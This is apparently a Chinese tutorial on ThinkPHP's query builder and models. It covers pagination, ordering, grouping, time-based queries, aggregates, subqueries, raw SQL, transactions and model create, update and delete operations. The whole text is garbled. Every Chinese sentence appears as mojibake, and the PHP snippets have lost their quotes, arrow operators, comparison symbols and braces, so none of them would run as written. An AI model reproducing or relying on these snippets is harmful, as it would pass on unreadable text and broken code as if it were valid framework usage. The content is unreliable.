è¡¨è¿›è¡Œå…³è”ï¼Œè¿™é‡Œçœ‹æ‰‹å†Œå¥½äº†ï¼Œæ²¡è¡¨æµ‹è¯•alias(a)-join() ä½¿ç”¨ limit() æ–¹æ³•ï¼Œé™åˆ¶è·å–è¾“å‡ºæ•°æ®çš„ä¸ªæ•°ï¼› // æ˜¾ç¤ºå‰5æ¡$user = Db::name(user)-limit(5)-select(); åˆ†é¡µæ¨¡å¼ï¼Œå³ä¼ é€’ä¸¤ä¸ªå‚æ•°ï¼Œæ¯”å¦‚ä»ç¬¬ 3 æ¡å¼€å§‹æ˜¾ç¤º 5 æ¡ limit(2,5)ï¼› // ä»ç¬¬2ä¸ªä½ç½®ï¼Œä¹Ÿå°±æ˜¯ç¬¬3æ¡å¼€å§‹ï¼Œæ˜¾ç¤º5æ¡$user = Db::name(user)-limit(2,5)-select();// æŸ¥è¯¢ç¬¬ä¸€é¡µæ•°æ®ï¼Œ1è‡³10æ¡$user = Db::name(user)-page(1,10)-select(); ä½¿ç”¨ order() æ–¹æ³•ï¼Œå¯ä»¥æŒ‡å®šæ’åºæ–¹å¼ï¼Œæ²¡æœ‰æŒ‡å®šç¬¬äºŒå‚æ•°ï¼Œé»˜è®¤ ascï¼› // æŒ‰idå€’åºæ’åˆ—$user = Db::name(user)-order(id, desc)-select(); æ”¯æŒæ•°ç»„çš„æ–¹å¼ï¼Œå¯¹å¤šä¸ªå­—æ®µè¿›è¡Œæ’åºï¼› // æŒ‰å¤šä¸ªå­—æ®µè§„åˆ™æ’åº$user = Db::name(user)-order([age=asc, id=desc])-select();//æ”¯æŒ orderRaw() æ–¹æ³•ï¼Œå¯ä»¥ä¼ å…¥SQLå‡½æ•°ï¼Œå’Œå‰é¢å„ç±»Rawä¸€æ ·ï¼Œä¸å†èµ˜è¿° ä½¿ç”¨ group() æ–¹æ³•ï¼Œç»™æ€§åˆ«ä¸åŒçš„äººè¿›è¡Œ age å­—æ®µçš„æ€»å’Œç»Ÿè®¡ï¼› // ç»Ÿè®¡æ€§åˆ«çš„å¹´é¾„æ€»å’Œ$user = Db::name(user)-fieldRaw(gender, SUM(age)) -group(gender)-select(); ä½¿ç”¨ group() åˆ†ç»„ä¹‹åï¼Œå†ä½¿ç”¨ having() è¿›è¡Œç­›é€‰ï¼› // ç»Ÿè®¡æ€§åˆ«çš„å¹´é¾„æ€»å’Œï¼Œç­›é€‰å¤§äº100çš„$user = Db::name(user)-fieldRaw(gender, SUM(age)) -group(gender) -having(SUM(age) 100)-select(); æ—¶é—´æŸ¥è¯¢ å¯ä»¥ä½¿ç”¨ ã€ã€ã€ æ¥ç­›é€‰åŒ¹é…æ—¶é—´çš„æ•°æ®ï¼› // ä¼ ç»Ÿæ—¶é—´ç­›é€‰$user = Db::name(user)-where(create_time, , 2022-1-1)-select();$user = Db::name(user)-where(create_time, between, [2020-1-1, 2023-1-1])-select(); å¿«æ·æ–¹å¼ whereTimeï¼š // ä½¿ç”¨å¿«æ·æ–¹å¼æŸ¥è¯¢$user = Db::name(user)-whereTime(create_time, =, 2022-1-1)-select();// é»˜è®¤æ˜¯ å¯ä»¥çœç•¥$user = Db::name(user)-whereTime(create_time, 2022-1-1)-select(); åŒºé—´æŸ¥è¯¢å¿«æ·æ–¹å¼ whereBetweenTimeï¼š // åŒºé—´æŸ¥è¯¢ï¼ŒåŒ…å« whereNotBetweenTime$user = Db::name(user)-whereBetweenTime(create_time, 2020-1-1, 2023-1-1)-select(); ä½¿ç”¨ whereYear æŸ¥è¯¢ä»Šå¹´çš„æ•°æ®ã€å»å¹´çš„æ•°æ®å’ŒæŸä¸€å¹´çš„æ•°æ®ï¼› // æŸ¥è¯¢ä»Šå¹´$user = Db::name(user)-whereYear(create_time)-select();// æŸ¥è¯¢å»å¹´$user = Db::name(user)-whereYear(create_time, last year)-select();// æŸ¥è¯¢æŸä¸€å¹´$user = Db::name(user)-whereYear(create_time, 2019)-select(); ä½¿ç”¨ whereMonth æŸ¥è¯¢å½“æœˆçš„æ•°æ®ã€ä¸Šæœˆçš„æ•°æ®å’ŒæŸä¸€ä¸ªæœˆçš„æ•°æ®ï¼› Db::name(user)-whereMonth(create_time)-select();Db::name(user)-whereMonth(create_time, last month)-select();Db::name(user)-whereMonth(create_time, 2020-6)-select(); ä½¿ç”¨ whereDay æŸ¥è¯¢ä»Šå¤©çš„æ•°æ®ã€æ˜¨å¤©çš„æ•°æ®å’ŒæŸä¸€ä¸ªå¤©çš„æ•°æ®ï¼› Db::name(user)-whereDay(create_time)-select();Db::name(user)-whereDay(create_time, last day)-select();Db::name(user)-whereDay(create_time, 2020-6-27)-select(); æŸ¥è¯¢æŒ‡å®šæ—¶é—´çš„æ•°æ®ï¼Œæ¯”å¦‚ä¸¤å°æ—¶å†…çš„ï¼› // ä¸¤å°æ—¶å†…çš„$user = Db::name(user)-whereTime(create_time, -2 hours)-select(); æŸ¥è¯¢ä¸¤ä¸ªæ—¶é—´å­—æ®µæ—¶é—´æœ‰æ•ˆæœŸçš„æ•°æ®ï¼Œæ¯”å¦‚æ´»åŠ¨å¼€å§‹åˆ°ç»“æŸçš„æœŸé—´ï¼› æ¯”å¦‚åˆ›å»ºä¸¤ä¸ªå­—æ®µï¼šstart_timeï¼Œend_timeï¼Œæ³¨å†Œåï¼Œåˆ†åˆ«å†™å…¥å¯¹åº”æ—¶é—´è¡¨æ˜å®ƒçš„æœ‰æ•ˆæœŸï¼› // ç›´æ¥è¿™ä¹ˆå†™ï¼Œä¸å¤ªå¥½ç†è§£ï¼Œçœ‹æ‰‹å†Œçš„å¦ä¸€ç§æ™®é€šå†™æ³•å¾ˆå®¹æ˜“ç†è§£// å®æˆ˜ä¸­ï¼Œå­—æ®µä¸°å¯Œçš„æ—¶å€™å†æ¼”ç¤º$user = Db::name(user)-whereBetweenTimeField(start_time, end_time)-select(); èšåˆæŸ¥è¯¢ ä½¿ç”¨ count() æ–¹æ³•ï¼Œå¯ä»¥æ±‚å‡ºæ‰€æŸ¥è¯¢æ•°æ®çš„æ•°é‡ï¼› // è·å–è®°å½•æ•°$user = Db::name(user)-count(); count() å¯è®¾ç½®æŒ‡å®š idï¼Œæ¯”å¦‚æœ‰ç©ºå€¼(Null)çš„ detailsï¼Œä¸ä¼šè®¡ç®—æ•°é‡ï¼› // å€¼NULLä¸è®¡æ•°$user = Db::name(user)-count(details); ä½¿ç”¨ max() æ–¹æ³•ï¼Œæ±‚å‡ºæ‰€æŸ¥è¯¢æ•°æ®å­—æ®µçš„æœ€å¤§å€¼ï¼› // æ±‚æœ€å¤§å¹´é¾„$user = Db::name(user)-max(age); å¦‚æœ max() æ–¹æ³•ï¼Œæ±‚å‡ºçš„å€¼ä¸æ˜¯æ•°å€¼ï¼Œåˆ™é€šè¿‡ç¬¬äºŒå‚æ•°å¼ºåˆ¶è½¬æ¢ï¼› // å¦‚æœæœ€å¤§å€¼ä¸æ˜¯æ•°å€¼ï¼Œfalseå…³é—­å¼ºåˆ¶è½¬æ¢$user = Db::name(user)-max(name, false); ä½¿ç”¨ min() æ–¹æ³•ï¼Œæ±‚å‡ºæ‰€æŸ¥è¯¢æ•°æ®å­—æ®µçš„æœ€å°å€¼ï¼Œä¹Ÿå¯ä»¥å¼ºåˆ¶è½¬æ¢ï¼› // æ±‚æœ€å°å€¼$user = Db::name(user)-min(age); ä½¿ç”¨ avg() æ–¹æ³•ï¼Œæ±‚å‡ºæ‰€æŸ¥è¯¢æ•°æ®å­—æ®µçš„å¹³å‡å€¼ï¼› // æ±‚å¹³å‡å€¼$user = Db::name(user)-avg(age); ä½¿ç”¨ sum() æ–¹æ³•ï¼Œæ±‚å‡ºæ‰€æŸ¥è¯¢æ•°æ®å­—æ®µçš„æ€»å’Œï¼› // æ±‚æ€»å’Œ$user = Db::name(user)-sum(age); å­æŸ¥è¯¢ ä½¿ç”¨ fetchSql() æ–¹æ³•ï¼Œä¼ é€’å‚æ•°trueæ—¶ï¼Œå¯ä»¥è®¾ç½®ä¸æ‰§è¡Œ SQLï¼Œç›´æ¥è¿”å›SQLè¯­å¥ï¼› // å­æŸ¥è¯¢è¯­å¥$user = Db::name(user)-fetchSql(true)-select(); ä½¿ç”¨ buildSql() æ–¹æ³•ï¼Œä¹Ÿæ˜¯è¿”å› SQL è¯­å¥ï¼Œä¸éœ€è¦å†æ‰§è¡Œ select()ï¼Œä¸”æœ‰æ‹¬å·ï¼› // ç¬¬äºŒç§å­æŸ¥è¯¢$subQuery = Db::name(user)-buildSql(true); ç»“åˆä»¥ä¸Šæ–¹æ³•ï¼Œæˆ‘ä»¬å®ç°ä¸€ä¸ªå­æŸ¥è¯¢ï¼› // å­æŸ¥è¯¢æ ·å¼$subQuery = Db::name(user)-field(id)-where(age,, 18)-buildSql();$user = Db::name(user)-whereExp(id, IN .$subQuery)-select(); ä½¿ç”¨é—­åŒ…çš„æ–¹å¼æ‰§è¡Œå­æŸ¥è¯¢ï¼› // é‡‡ç”¨é—­åŒ…æ„å»ºå­æŸ¥è¯¢$user = Db::name(user)-where(id, IN, function ($query) $query-name(user)-field(id)-where(age,, 18);)-select(); åŸç”ŸæŸ¥è¯¢ ä½¿ç”¨ query() æ–¹æ³•ï¼Œè¿›è¡ŒåŸç”Ÿ SQL æŸ¥è¯¢ï¼Œé€‚ç”¨äºè¯»å–æ“ä½œï¼ŒSQL é”™è¯¯è¿”å› falseï¼› // åŸç”ŸSQL$user = Db::query(SELECT * FROM tp_user); ä½¿ç”¨ execute æ–¹æ³•ï¼Œè¿›è¡ŒåŸç”Ÿ SQL æ›´æ–°å†™å…¥ç­‰ï¼ŒSQL é”™è¯¯è¿”å› falseï¼› // åŸç”Ÿæ›´æ–°å†™å…¥$user = Db::execute(update tp_user set details=å¿«å¿«å¿«æ¥æ•‘æˆ‘ï¼ where id=5); åˆ—å­—æ®µå¿«æ·æŸ¥è¯¢ ä¹‹å‰ç”¨è¿‡è¯¸å¦‚ï¼šwhereInã€whereExpã€whereLikeç­‰ç­‰å¿«æ·æŸ¥è¯¢ï¼› æ‰€æœ‰å¿«æ·æŸ¥è¯¢åˆ—è¡¨çš„æ‰‹å†Œä½ç½®ï¼šæ•°æ®åº“ - æŸ¥è¯¢æ„é€ å™¨ - é«˜çº§æŸ¥è¯¢ä¸­ï¼Œæ‰¾åˆ°å¿«æ·æŸ¥è¯¢è¡¨æ ¼ï¼› whereColumn() æ–¹æ³•ï¼Œæ¯”è¾ƒä¸¤ä¸ªå­—æ®µçš„å€¼ï¼Œç¬¦åˆçš„å°±ç­›é€‰å‡ºæ¥ï¼› // å­—æ®µæ¯”è¾ƒï¼Œidå¤§äºage$user = Db::name(user)-whereColumn(id, , age)-select();// å¦‚æœæ˜¯ ç­‰äºåˆ¤æ–­ å¯ä»¥ç®€åŒ–-whereColumn(id, age) whereFieldName() æ–¹æ³•ï¼ŒæŸ¥è¯¢æŸä¸ªå­—æ®µçš„å€¼ï¼Œæ³¨æ„ FileName æ˜¯å­—æ®µåï¼› // è·å–æ‰€æœ‰æ€§åˆ«ä¸ºï¼šç”·$user = Db::name(user)-whereGender(ç”·)-select();// è·å–åå­—å«ç‹äºŒç‹—çš„ä¿¡æ¯$user = Db::name(user)-whereName(ç‹äºŒç‹—)-find(); getByFieldName() æ–¹æ³•ï¼ŒæŸ¥è¯¢æŸä¸ªå­—æ®µçš„å€¼ï¼Œæ³¨æ„åªèƒ½æŸ¥è¯¢ä¸€æ¡ï¼Œä¸éœ€è¦ **find()**ï¼› // å•æ¡æ•°æ®$user = Db::name(user)-getByName(ç‹äºŒç‹—); getFieldByFieldName() æ–¹æ³•ï¼Œé€šè¿‡æŸ¥è¯¢å¾—åˆ°æŸä¸ªæŒ‡å®šå­—æ®µçš„å•ä¸€å€¼ï¼› // æŸ¥è¯¢å•æ¡å¹¶è¿”å›å•åˆ—ï¼Œæ‰¾å‡ºç‹äºŒç‹—çš„å¹´é¾„$user = Db::name(user)-getFieldByName(ç‹äºŒç‹—, age); æ¡ä»¶æŸ¥è¯¢ when() å¯ä»¥é€šè¿‡æ¡ä»¶åˆ¤æ–­ï¼Œæ‰§è¡Œé—­åŒ…é‡Œçš„åˆ†æ”¯æŸ¥è¯¢ï¼› // æ¡ä»¶åˆ¤æ–­$user = Db::name(user)-when(false, function ($query) // æ»¡è¶³æ¡ä»¶æ‰§è¡Œè¿™æ®µSQL $query-where(id, , 5);, function ($query) // ä¸æ»¡è¶³æ¡ä»¶æ‰§è¡Œè¿™æ®µSQL $query-where(id, =, 5);)-select(); ç¬¬ä¸€ä¸ªå‚æ•° false æ˜¯æ¡ä»¶ï¼Œå¦‚æœè¯¥æ¡ä»¶ä¸º trueï¼Œåˆ™æ‰§è¡Œç¬¬ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¦åˆ™æ‰§è¡Œç¬¬äºŒä¸ªåŒ¿åå‡½æ•°ã€‚ äº‹åŠ¡ æ•°æ®åº“çš„è¡¨å¼•æ“éœ€è¦æ˜¯ InnoDB æ‰å¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœä¸æ˜¯è°ƒæ•´å³å¯ï¼› äº‹åŠ¡å¤„ç†ï¼Œéœ€è¦æ‰§è¡Œå¤šä¸ª SQL æŸ¥è¯¢ï¼Œæ•°æ®æ˜¯å…³è”æ’å®šçš„ï¼› å¦‚æœæˆåŠŸä¸€æ¡æŸ¥è¯¢ï¼Œæ”¹å˜äº†æ•°æ®ï¼Œè€Œåä¸€æ¡å¤±è´¥ï¼Œåˆ™å‰é¢çš„æ•°æ®å›æ»šï¼› æ¯”å¦‚ï¼šé“¶è¡Œå–é’±ï¼Œé“¶è¡ŒATMæ‰£äº†1000ï¼Œä½†å…¥å£è¢«å¡ä½ï¼Œä½ æ²¡æ‹¿åˆ°ï¼Œè¿™æ—¶éœ€è¦äº‹åŠ¡å¤„ç†ï¼› ç³»ç»Ÿæä¾›äº†ä¸¤ç§äº‹åŠ¡å¤„ç†çš„æ–¹å¼ï¼Œç¬¬ä¸€ç§æ˜¯è‡ªåŠ¨å¤„ç†ï¼Œå‡ºé”™è‡ªåŠ¨å›æ»šï¼› // å‡ºç°å¼‚å¸¸å›æ»šDb::transaction(function () Db::name(user)-delete(12); Db::name(user)-findOrFail(13);); æ‰‹åŠ¨å¤„ç†ï¼ŒåŸºæœ¬å’ŒåŸç”Ÿå¤„ç†ç±»ä¼¼ï¼Œå¯ä»¥è‡ªè¡Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼› // å¯åŠ¨äº‹åŠ¡Db::startTrans();try Db::name(user)-delete(12); Db::name(user)-findOrFail(13); //æäº¤äº‹åŠ¡ Db::commit(); catch (\\Exception $e) echo æ‰§è¡ŒSQLå¤±è´¥ï¼; // å›æ»š Db::rollback(); è·å–å™¨ è·å–å™¨çš„æ„æ€å°±æ˜¯ï¼šå°†æ•°æ®çš„å­—æ®µè¿›è¡Œè½¬æ¢å¤„ç†å†è¿›è¡Œæ“ä½œï¼› æ¯”å¦‚åœ¨è·å–æ•°æ®åˆ—è¡¨çš„æ—¶å€™ï¼Œå°†è·å–åˆ°çš„è¯¦æƒ…å­—æ®µå…¨éƒ¨å¤§å†™ï¼› // è·å–å™¨æ”¹å˜å­—æ®µå€¼$user = Db::name(user)-withAttr(details, function ($value, $data) // NULL ä¸å¤„ç† if ($value != null) return strtoupper($value); )-select(); withAtträ¹Ÿæ˜¯æ”¯æŒJSONå­—æ®µçš„ï¼Œå…·ä½“å‚è€ƒæ‰‹å†Œ æŸ¥è¯¢æ„é€ å™¨ - è·å–å™¨ï¼› é«˜çº§æŸ¥è¯¢ç´¢å¼•å…³è” where æ–¹æ³•çš„æ•°ç»„æŸ¥è¯¢ï¼š // æ€§åˆ«ç”·ï¼Œå¹´é¾„å¤§äº15å²ï¼Œå¸¸è§„åšæ³•$user = Db::name(user)-where(age, , 15) -where(gender, ç”·)-select();// ç´¢å¼•æ•°ç»„æ–¹å¼ï¼ŒäºŒç»´æ•°ç»„ï¼Œè¿”å›çš„SQL æ˜¯ä¸€æ¡ AND å¹¶åˆ—å…³ç³»$user = Db::name(user)-where([ [age, , 15], [gender,=, ç”·]])-select();// å¦‚æœæ˜¯ç­‰äºï¼Œå¯ä»¥ç›´æ¥ç”¨å…³è”æ•°ç»„ï¼Œä¸€ç»´$user = Db::name(user)-where([ age = 15, gender = ç”·])-select();// ä¸¤ç§æ¨¡å¼ç»“åˆèµ·æ¥ï¼Œ$user = Db::name(user)-where([ [age, , 15], gender = ç”·])-select();// æœç´¢æ¡ä»¶ç‹¬ç«‹ç®¡ç†ï¼Œè¿™é‡Œ=å·å†™å…¨$map[] = [age, , 15];$map[] = [gender,=, ç”·];$user = Db::name(user)-where($map)-select(); æ‹¼è£…æŸ¥è¯¢ ä½¿ç”¨ |(OR) æˆ– (AND) æ¥å®ç° where æ¡ä»¶çš„é«˜çº§æŸ¥è¯¢ï¼Œwhere æ”¯æŒå¤šä¸ªè¿ç¼€ï¼› // orå’Œand æ‹¼è£…æŸ¥è¯¢$user = Db::name(user)-where(name|details, like, %ç‹%) -where(idcreate_time, , 0) -select();// æ‹¼è£…è¿”å›çš„SQLSELECT * FROM `tp_user` WHERE ( `name` LIKE %ç‹% OR `details` LIKE %ç‹% ) AND ( `id` 0 AND `create_time` 0 ) ç´¢å¼•æ•°ç»„æ–¹å¼ï¼Œå¯ä»¥åœ¨ where è¿›è¡Œå¤šä¸ªå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼› // ç´¢å¼•æ•°ç»„æ‹¼è£…$user = Db::name(user)-where([ [id, , 5], [gender, =, å¥³], [age, =, 15], [details, like, %æˆ‘%]])-select();// æ‹¼è£…è¿”å›çš„SQLSELECT * FROM `tp_user` WHERE `id` 5 AND `gender` = å¥³ AND `age` = 15 AND `details` LIKE %æˆ‘% æ¡ä»¶å­—ç¬¦ä¸²å¤æ‚ç»„è£…ï¼Œæ¯”å¦‚ä½¿ç”¨ exp äº†ï¼Œå°±ä½¿ç”¨ raw() æ–¹æ³•ï¼› // exp æ‹¼è£…$user = Db::name(user)-where([ [gender, =, ç”·], [age, exp, Db::raw(=10 AND id5)]])-select();// æ‹¼è£…è¿”å›çš„SQLSELECT * FROM `tp_user` WHERE `gender` = ç”· AND ( `age` =10 AND id5 ) å¦‚æœæœ‰å¤šä¸ªwhereï¼Œå¹¶éœ€è¦æ§åˆ¶ä¼˜å…ˆçº§ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨éœ€è¦çš„éƒ¨åˆ†åŠ ä¸Šä¸­æ‹¬å·ï¼› // ä¸‹é¢çš„ä»£ç æ— æ³•æ§åˆ¶ä¼˜å…ˆçº§$user = Db::name(user)-where([ [gender, =, ç”·], [age, exp, Db::raw(=10 AND id5)]])-where(details, like, %æˆ‘%)-select();// å¤–åŠ ä¸€ä¸ªä¸­æ‹¬å·-where([[ ...]]) // æ‹¼è£…è¿”å›çš„SQLSELECT * FROM `tp_user` WHERE ( `gender` = ç”· AND ( `age` =10 AND id5 ) ) AND `details` LIKE %æˆ‘% // æ¨èç”¨å˜é‡ä»£æ›¿$map =[ [gender, =, ç”·], [age, exp, Db::raw(=10 AND id5)]];-where([$map]) å¦‚æœï¼Œæ¡ä»¶ä¸­æœ‰å¤šæ¬¡å‡ºç°ä¸€ä¸ªå­—æ®µï¼Œå¹¶ä¸”éœ€è¦ OR æ¥å·¦å³ç­›é€‰ï¼Œå¯ä»¥ç”¨ whereOrï¼› // å¤šæ¡ä»¶é‡å¤å­—æ®µ OR é€‰é¡¹$map1 = [ [name, like, %ç‹%], [details, =, null]];$map2 = [ [gender, =, å¥³], [details, exp, Db::raw(IS NOT NULL)]];$user = Db::name(user)-whereOr([$map1, $map2])-select();// æ‹¼è£…è¿”å›çš„SQLSELECT * FROM `tp_user` WHERE ( `name` LIKE %ç‹% AND `details` IS NULL ) OR ( `gender` = å¥³ AND ( `details` IS NOT NULL ) ) æ¨¡å‹å®šä¹‰å®šä¹‰æ¨¡å‹ ä¸ºäº†é¿å…è¢«å‰é¢è¯¾ç¨‹ä¸­æ§åˆ¶å™¨çš„ç±»åå¹²æ‰°ï¼Œåˆ é™¤æˆ–æ”¹åéƒ½è¡Œï¼š // UserBak.phpï¼Œç›®å‰ä¸å­˜åœ¨ä»»ä½•åœ°æ–¹çš„User.phpäº†class UserBak extends BaseController å®šä¹‰ä¸€ä¸ªå’Œæ•°æ®åº“è¡¨ç›¸åŒ¹é…çš„æ¨¡å‹ï¼Œå¯åœ¨appåº”ç”¨ç›®å½•ä¸‹åˆ›å»ºmodelæ–‡ä»¶å¤¹ï¼› namespace app\\model;use think\\Model;class User extends Model æ¨¡å‹ä¼šè‡ªåŠ¨å¯¹åº”æ•°æ®è¡¨ï¼Œå¹¶ä¸”æœ‰ä¸€å¥—è‡ªå·±çš„å‘½åè§„åˆ™ï¼› æ¨¡å‹ç±»éœ€è¦å»é™¤è¡¨å‰ç¼€(tp_)ï¼Œé‡‡ç”¨é©¼å³°å¼å‘½åï¼Œå¹¶ä¸”é¦–å­—æ¯å¤§å†™ï¼› tp_user(è¡¨å) = Usertp_user_type(è¡¨å) = UserType åœ¨æ§åˆ¶å™¨æ®µåˆ›å»ºä¸€ä¸ªä»»æ„åç§°çš„ç±»ï¼Œå½“ç„¶æœ‰è¯­ä¹‰æ›´å¥½ï¼Œä½†ä¸ºäº†æ•™å­¦ç†è§£èµ·åä¸ºï¼šTestUser.phpï¼› namespace app\\controller;use app\\model\\User;// æ³¨æ„ï¼šç±»åä¸é™åˆ¶class TestUser public function index() return json(User::select()); æ¨¡å‹è®¾ç½® ç³»ç»Ÿä¼šè‡ªåŠ¨è¯†åˆ« æ¨¡å‹ç±»å å¯¹åº” è¡¨åï¼ŒUser.php å¯¹åº” user è¡¨ï¼ˆä¸å«å‰ç¼€ï¼‰ï¼› ä½†å¦‚æœä½ çš„æ¨¡å‹ç±»åä¸æ˜¯æŒ‰ç…§è§„åˆ™å¯¹åº”è¡¨åï¼Œåˆ™éœ€è¦é€šè¿‡æˆå‘˜å­—æ®µå»è®¾ç½®ï¼› class Abc extends Model // è®¾ç½®è¡¨å protected $name = user;// ä½¿ç”¨$tableæ—¶ï¼ŒæŒ‡å®šè¡¨æ—¶éœ€è¦å®Œæ•´çš„è¡¨åï¼štp_user ç³»ç»Ÿä¹Ÿä¼šé»˜è®¤idä¸ºä½ çš„ä¸»é”®åï¼Œå¦‚æœä¸æ˜¯idï¼Œåˆ™éœ€è¦è®¾ç½®ï¼› // è®¾ç½®ä¸»é”®protected $pk = uid; æ¨¡å‹æ”¯æŒåˆå§‹åŒ–åŠŸèƒ½ï¼Œéœ€è¦è®¾ç½®é™æ€æ–¹æ³•ï¼Œå¹¶åªåœ¨ç¬¬ä¸€æ¬¡å®ä¾‹åŒ–çš„æ—¶å€™æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ï¼› protected static function init()\techo åˆå§‹åŒ–; æ–°å¢å’Œåˆ é™¤æ–°å¢æ“ä½œ ç”¨æ¨¡å‹æ–°å¢æ•°æ®ï¼Œé¦–å…ˆè¦å®ä¾‹åŒ–æ¨¡å‹ï¼Œå¼€å‘å·¥å…·ä¼šè¡¥å…¨useï¼Œéé›†æˆå·¥å…·åˆ«å¿˜äº†ï¼› use app\\model\\User;// æ‰‹å†Œnew Userï¼Œè¿™é‡Œæ‹¬å·æ˜¯å·¥å…·è¡¥å…¨çš„ï¼Œéƒ½å¯ä»¥$user = new User(); ä½¿ç”¨å®ä¾‹åŒ–çš„æ–¹å¼æ·»åŠ ä¸€æ¡æ•°æ®ï¼Œå¹¶ä½¿ç”¨ save() æ–¹æ³•è¿›è¡Œä¿å­˜ï¼› æ³¨æ„ï¼šä½¿ç”¨æ¨¡å‹æ—¶ï¼Œä¼šè‡ªåŠ¨ç»™æ—¶é—´å­—æ®µ create_timeï¼Œupdate_timeï¼ˆè¦æœ‰è¯¥å­—æ®µï¼‰å†™å…¥å½“å‰æ—¶é—´ï¼› $user = new User();$user-name = æç™½;$user-age = 28;$user-gender = ç”·;$user-details = åºŠå‰æ˜æœˆå…‰ï¼Œå¥½è¯—ï¼;// æˆåŠŸè¿”å›trueï¼Œå¤±è´¥æŠ›å¼‚å¸¸ï¼Œå…¶å®ƒçœ‹æ‰‹å†Œ$user-save(); ä¹Ÿå¯ä»¥é€šè¿‡ save() ä¼ é€’æ•°æ®æ•°ç»„çš„æ–¹å¼ï¼Œæ¥æ–°å¢æ•°æ®ï¼› $user-save([ name = æœç”«, age = 19, gender = ç”·, details = ä¸€è¡Œç™½é¹­ä¸Šé’å¤©ï¼Œå¥½è¯—ï¼]); ä½¿ç”¨ allowField() æ–¹æ³•ï¼Œå…è®¸è¦å†™å…¥çš„å­—æ®µï¼Œå…¶å®ƒå­—æ®µå°±æ— æ³•å†™å…¥äº†ï¼› $user-allowField([name,age,gender])-save([ name = è’²æ¾é¾„, age = 25, gender = ç”·, details = åé‡Œå¹³æ¹–éœœæ»¡å¤©ï¼Œå¥½è¯—ï¼]); æ¨¡å‹æ–°å¢ä¹Ÿæä¾›äº† replace() æ–¹æ³•æ¥å®ç° REPLACE into æ–°å¢ï¼› $user-replace()-save([ id = 15, name = è’²æ¾é¾„, age = 25, gender = ç”·, details = åé‡Œå¹³æ¹–éœœæ»¡å¤©ï¼Œå¥½è¯—ï¼]); å½“æ–°å¢æˆåŠŸåï¼Œä½¿ç”¨ $user-id ï¼Œå¯ä»¥è·å¾—è‡ªå¢ IDï¼ˆä¸»é”®éœ€æ˜¯ idï¼‰ï¼› return $user-id; ä½¿ç”¨ saveAll()æ–¹æ³•ï¼Œå¯ä»¥æ‰¹é‡æ–°å¢æ•°æ®ï¼Œè¿”å›æ‰¹é‡æ–°å¢çš„æ•°ç»„ï¼› return $user-saveAll([ [ name = èµµå…­, age = 19, gender= ç”· ], [ name = é’±ä¸ƒ, age = 22, gender= ç”·, details = æˆ‘å¾ˆæœ‰é’±ï¼Œæ’è¡Œè€ä¸ƒï¼ ]]); ä½¿ç”¨ ::create() é™æ€æ–¹æ³•ï¼Œæ¥åˆ›å»ºè¦æ–°å¢çš„æ•°æ®ï¼› $user = User::create([ name = æé€é¥, age = 18, gender= ç”·, details = æˆ‘æ˜¯ä¸€ä»£ä¸»è§’ï¼], [name, age, gender, details], false);//å‚æ•° 1 æ˜¯æ–°å¢æ•°æ®æ•°ç»„ï¼Œå¿…é€‰//å‚æ•° 2 æ˜¯å…è®¸å†™å…¥çš„å­—æ®µï¼Œå¯é€‰//å‚æ•° 3 ä¸ºæ˜¯å¦ replace å†™å…¥ï¼Œå¯é€‰ï¼Œé»˜è®¤ false ä¸º Insert å†™å…¥return $user-id; åˆ é™¤æ“ä½œ ä½¿ç”¨ find() æ–¹æ³•ï¼Œé€šè¿‡ä¸»é”® (id) æŸ¥è¯¢åˆ°æƒ³è¦åˆ é™¤çš„æ•°æ®ï¼› ç„¶åå†é€šè¿‡ delete()æ–¹æ³•ï¼Œå°†æ•°æ®åˆ é™¤ï¼Œè¿”å›å¸ƒå°”å€¼ï¼› // æ ¹æ®ä¸»é”®å€¼ï¼Œåˆ é™¤æ•°æ®$user = User::find(20);return $user-delete(); ä¹Ÿå¯ä»¥ä½¿ç”¨é™æ€æ–¹æ³•è°ƒç”¨ destroy()æ–¹æ³•ï¼Œé€šè¿‡ä¸»é”®(id)åˆ é™¤æ•°æ®ï¼› // å•æ¡åˆ é™¤return User::destroy(21);// æ‰¹é‡åˆ é™¤return User::destroy([22, 33, 44]);// æ¡ä»¶åˆ é™¤return User::where(id, , 15)-delete();ï¼ˆè¿”å›åˆ é™¤çš„æ¡ç›®æ•°ï¼‰ destroy() æ–¹æ³•ï¼Œä½¿ç”¨é—­åŒ…çš„æ–¹å¼è¿›è¡Œåˆ é™¤ï¼› // é—­åŒ…æ¨¡å¼User::destroy(function ($query) $query-where(id, , 15);); æ›´æ–°æ•°æ®æ›´æ–° ä½¿ç”¨ find()æ–¹æ³•è·å–æ•°æ®ï¼Œç„¶åé€šè¿‡ save()æ–¹æ³•ä¿å­˜ä¿®æ”¹ï¼Œè¿”å›å¸ƒå°”å€¼ï¼› $user = User::find(19);$user-details = æˆ‘æ˜¯ä¸€ä»£ä¸»è§’ï¼;return $user-save(); é€šè¿‡ where()æ–¹æ³•ç»“åˆ find()æ–¹æ³•çš„æŸ¥è¯¢æ¡ä»¶è·å–çš„æ•°æ®ï¼Œè¿›è¡Œä¿®æ”¹ï¼› $user = User::where(name, æé€é¥)-find();$user-details = æˆ‘æƒ³åšäºŒä»£ä¸»è§’ï¼;return $user-save(); save()æ–¹æ³•åªä¼šæ›´æ–°å˜åŒ–çš„æ•°æ®ï¼Œå¦‚æœæäº¤çš„ä¿®æ”¹æ•°æ®æ²¡æœ‰å˜åŒ–ï¼Œåˆ™ä¸æ›´æ–°ï¼› ä½†å¦‚æœä½ æƒ³å¼ºåˆ¶æ›´æ–°æ•°æ®ï¼Œå³ä½¿æ•°æ®ä¸€æ ·ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ force()æ–¹æ³•ï¼› // å¦‚ä½•éªŒè¯è¢«å¼ºåˆ¶äº†ï¼ŒæŸ¥çœ‹update_timeå­—æ®µæ˜¯å¦æ›´æ–°äº†$user-force()-save(); Db::raw()æ‰§è¡Œ SQL å‡½æ•°çš„æ–¹å¼ï¼ŒåŒæ ·åœ¨è¿™é‡Œæœ‰æ•ˆï¼› $user-age = Db::raw(age + 2); å…³äºéªŒè¯è¿‡æ»¤ï¼Œåç»­å­¦ä¹ Requestå†è¯´ï¼Œæ‰‹å†Œä¸­ æ¨¡å‹ - æ›´æ–° 